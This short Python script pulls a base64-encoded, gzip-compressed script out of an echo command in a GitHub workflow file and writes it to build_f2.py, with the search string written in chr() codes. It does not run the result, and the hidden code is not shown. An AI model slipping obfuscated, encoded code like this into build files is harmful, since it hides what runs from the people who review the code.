import base64,gzip,io
s=io.open('.github/workflows/build_fortnight2.yml',encoding='utf-8').read()
b=s.split(chr(101)+chr(99)+chr(104)+chr(111)+chr(32)+chr(39))[1].split(chr(39))[0]
open('build_f2.py','wb').write(gzip.decompress(base64.b64decode(b)))
